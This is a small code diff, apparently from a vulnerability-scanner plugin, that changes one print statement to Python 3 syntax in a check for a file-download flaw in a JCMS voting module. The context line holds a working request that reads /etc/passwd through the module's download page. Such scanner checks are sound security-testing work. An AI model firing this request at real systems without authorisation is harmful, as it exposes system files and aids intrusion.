@@ -17,7 +17,7 @@ def  audit(arg):
     url=arg+"jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd"
     #print url 
     code,head,res,errcode,finalurl=curl.curl2(url)
-    print res
+    print(res)
     if code==200 and  ":/bin/bash" in res:
         security_hole('file download Vulnerable:'+url)
 
